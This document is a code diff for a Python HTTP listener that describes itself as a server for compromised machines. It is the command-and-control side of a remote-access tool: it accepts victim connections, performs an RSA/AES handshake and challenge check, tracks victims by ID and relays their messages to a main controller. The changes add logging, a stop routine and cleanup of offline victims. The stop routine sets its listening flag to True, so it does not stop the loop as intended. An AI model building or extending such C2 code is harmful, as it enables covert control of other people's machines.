@@ -1,3 +1,10 @@
+'''
+Description: HTTP listener for compromised machines.
+Author: iss4cf0ng/ISSAC
+Acknowledgement:
+    - AES pure implementation: https://github.com/bozhu/AES-Python
+'''
+
 import socket
 import base64
 import threading
@@ -29,6 +36,7 @@ class Listener:
 
         self.sock.bind((ip, port))
         self.bListen = sock.fileno() != -1
+        self.listening = False
 
         self.msg_handler = None
 
@@ -42,28 +50,51 @@ class Listener:
 
     def start(self):
         self.sock.listen(10000)
+        self.sock.settimeout(1)
+        self.listening = True
 
-        while True:
-            clnt_victim, clnt_addr = self.sock.accept()
+        while self.listening:
+            try:
+                conn, addr = self.sock.accept()
+            except socket.timeout:
+                continue
+            except OSError:
+                break # socket closed
 
-            t = threading.Thread(target=self.handler, args=[clnt_victim, clnt_addr, ])
+            self.log.info(f'New client: ({addr[0]},{addr[1]})')
+
+            t = threading.Thread(target=self.handler, args=[conn, addr, ])
             t.daemon = True
 
             t.start()
+        
+        self.log.info('Listener thread exited.')
 
-            cp.pf_info(f'New client: {clnt_addr}')
+    def stop(self) -> bool:
+        try:
+            self.listening = True
+            self.sock.close()
+            self.log.info(f'Stopped')
+            return True
+        except Exception as ex:
+            self.log.error(str(ex))
+            return False
 
     def send_http_resp(self, szData: str):
         resp = self.get_httpResponse_body(szData)
         self.sock.sendall(resp.encode())
 
+    '''
+    victim's message handler.
+    '''
     def handler(self, clnt_sock: socket.socket, clnt_addr):
 
         clnt = Client(clnt_sock)
         clnt.addr = clnt_addr
         clnt.type = 'HTTP'
+        self.log.info(f'{clnt.addr}: Type=> {clnt.type}')
 
-        while clnt_sock.fileno() != -1:
+        while True:
             try:
                 abReq = clnt_sock.recv(C2P.BUFFER_MAX_LENGTH)
                 nRecv = len(abReq)
@@ -89,8 +120,8 @@ class Listener:
 
                 # Handler data
 
-                szMethod = aHeader[0].split(' ')[0]
-                szResource = aHeader[0].split(' ')[1]
+                szMethod = aHeader[0].split(' ')[0] # preserved
+                szResource = aHeader[0].split(' ')[1] # preserved
 
                 abBody = base64.b64decode(body)
                 c2p = C2P(abBuffer=abBody)
@@ -100,21 +131,21 @@ class Listener:
                 abMsg = c2p.get_msg()
 
                 if nCmd == 0:
-                    if nParam == 0:
+                    if nParam == 0: # disconnect
                         pass
-                    elif nParam == 1:
+                    elif nParam == 1: # reconnect.
                         pass
 
-                elif nCmd == 1:
+                elif nCmd == 1: # handshaking
                     if nParam == 0:
-                        cp.pf_ok('Generating RSA key pair.', clnt.addr)
+                        self.log.debug(f'{clnt.addr}: Generating RSA key pair.')
 
                         n_rsa_keysize = 4096
                         n, e, d, p, q = EZRSA(n_rsa_keysize).generate_rsa_keypair(n_rsa_keysize)
                         xml_PubKey = EZRSA(n_rsa_keysize).encode_public_key(n, e)
                         xml_PrivKey = EZRSA(n_rsa_keysize).encode_private_key(n, e, d, p, q)
 
-                        cp.pf_ok('RSA key pair is generated.', clnt.addr)
+                        self.log.debug(f'{clnt.addr}: RSA key pair is generated.')
 
                         clnt.xml_rsa_pubKey = xml_PubKey
                         clnt.xml_rsa_privKey = xml_PrivKey
@@ -158,11 +189,11 @@ class Listener:
                         szPlainResp = clnt.pAES.decrypt_cbc(ab_enc_resp).decode('utf-8')
 
                         if szPlainResp == clnt.szChallenge:
-                            cp.pf_ok('Vertification successed.', clnt.addr)
+                            self.log.info(f'{clnt.addr}: Vertification successed.')
 
                             clnt.http_sendcipher(2, 0, C2P.random_str())
                         else:
-                            cp.pf_err('Vertification failed.', clnt.addr)
+                            self.log.error(f'{clnt.addr}: Vertification failed.')
 
                 elif nCmd == 2:
                     cipher = Encoder.b64str2bytes(abMsg.decode('utf-8'))
@@ -208,10 +239,18 @@ class Listener:
                                     self.dic_victim.pop(clnt_addr)
                                     clnt.VictimID = obj_json['ID']
 
-                        self.msg_handler(self.main_listener, self, aMsg[0], clnt, aMsg[1:])
+                        # message forwarding, pass message from victim to main listener.
+                        if self.listening:
+                            self.msg_handler(self.main_listener, self, aMsg[0], clnt, aMsg[1:])
 
             except Exception as ex:
                 clnt_sock.close()
+                self.log.error(str(ex))
+
+        self.log.debug(f'Victim offline: {clnt.VictimID}')
+        if clnt.VictimID in self.dic_victim.keys():
+            self.dic_victim.pop(clnt.VictimID)
+            self.main_listener.boardcast_clnt(['disconnect', 'victim', clnt.VictimID])
         
     def get_httpResponse_body(self, szMessage: str) -> str:
         szMessage = Encoder.stre2b64(szMessage)
